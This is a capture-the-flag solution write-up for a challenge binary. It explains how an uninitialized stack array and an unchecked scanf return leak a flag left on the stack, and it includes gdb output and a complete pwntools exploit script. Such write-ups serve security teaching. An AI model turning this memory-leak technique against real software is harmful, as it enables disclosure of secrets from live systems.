# Enough With the Averages -- Solution

The simple binary allows the user to enter some number of integers and proceeds to calculate their average. The flag is read from the file when the program starts, but there seems to be no direct way to access it, or to subvert the program execution. 

```c
void read_flag() {
  FILE* in;
  char flag[64];
  in = fopen("flag.txt", "rt");
  fscanf(in, "%s", flag);
  fclose(in);
}

void vuln() {
  int score[20];
  int total = 0;  
  for (int i=0; i<20; i++) {
    printf("Enter score for player %d:\n", i);
    scanf("%d", &score[i]);
    total += score[i];
  }
  printf("Average score is %lf.\n", total/20.);
  printf("Type q to quit.");
  while (getchar() != 'q');
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  read_flag();
  vuln();
  return 0;
}
```

Examination of the source code reveals an issue we can take advantage of: the local variable `score` in `vuln` is uninitialized. It turns out that, since the `read_flag` is called immediately before `vuln`, storage for the local variables of `vuln` (i.e., `score`) will overlap with the storage for the local variables of `read_flag` (i.e., `flag`). 

Examination with the debugger confirms this to be the case. If we run the program, enter `-1` as the first score, and examine the stack frame, we discover that the storage for the local variable `score` starts at the offset 0x10 from the stack top, and the flag is still on the stack (starting from offset 0x20) and, therefore, overlaps with the variable `score`.

```bash
$ echo -1 | gdb ./chall -ex 'b *(vuln+98)' -ex 'run' -ex 'telescope $rsp -l 0x10'
0x007ffdaa048450│+0x0000: 0x00561be8c00800  →  <_start+0> xor ebp, ebp	 ← $rsp
0x007ffdaa048458│+0x0008: 0x0000000000000000
0x007ffdaa048460│+0x0010: 0x00000000ffffffff
0x007ffdaa048468│+0x0018: 0x00561be8e02260  →  0x0000000000000000
0x007ffdaa048470│+0x0020: "TBTL{e4t_Y0ur_vegG13s_1n1714l1z3_y0ur_d4rn_v4r14bl[...]"
0x007ffdaa048478│+0x0028: "_Y0ur_vegG13s_1n1714l1z3_y0ur_d4rn_v4r14bl35}"
0x007ffdaa048480│+0x0030: "gG13s_1n1714l1z3_y0ur_d4rn_v4r14bl35}"
0x007ffdaa048488│+0x0038: "1714l1z3_y0ur_d4rn_v4r14bl35}"
0x007ffdaa048490│+0x0040: "_y0ur_d4rn_v4r14bl35}"
0x007ffdaa048498│+0x0048: "rn_v4r14bl35}"
0x007ffdaa0484a0│+0x0050: 0x00007d35336c62 ("bl35}"?)
0x007ffdaa0484a8│+0x0058: 0x0000000000000000
0x007ffdaa0484b0│+0x0060: 0x007ffdaa0484d0  →  0x00561be8c00a90  →  <__libc_csu_init+0> push r15
0x007ffdaa0484b8│+0x0068: 0x1997755a578d2200
0x007ffdaa0484c0│+0x0070: 0x007ffdaa0484d0  →  0x00561be8c00a90  →  <__libc_csu_init+0> push r15	 ← $rbp
0x007ffdaa0484c8│+0x0078: 0x00561be8c00a84  →  <main+64> mov eax, 0x0
```

The program does't check the return value of `scanf` --- if we give it an input which is not an integer, `scanf("%d", &score[i]);` will just leave `score[i]` unchanged. Furthermore, all subsequent `scanf` calls will do the same. 

Hence, running the program with `k` integers as input (followed by a non-integer token) will give you an average of input integers and the integers corresponding to flag bytes starting from `score[k]`. If we run the program twice --- giving it `k` zeroes the first time and `k+1` zeroes the second time --- we can subtract the two averages and obtain the exact bytes of uninitialized `score[k]`. Hence, we can leak the flag (four bytes at the time) by running the program multiple times.

Putting it all together:
```python
#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('localhost', 3000)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            b *(vuln+459)
            continue
        ''')
    return p

def get(k):
    p = conn()
    for _ in range(k):
        p.sendlineafter(b':', b'0')
    p.sendlineafter(b':', b'n')
    p.recvuntil(b'Average score is')
    average = float(p.recvuntil(b'\n')[:-2])
    p.sendlineafter(b'quit', b'q')
    return int(average*20)

last = 0
flag = b''
for i in range(20):
    curr = get(i)
    diff = last-curr
    diff = (diff + 2**32)%(2**32)
    bytes = pack(diff, word_size=32, sign=False)
    if i >= 5:
        flag += bytes
    last = curr

print(flag)
```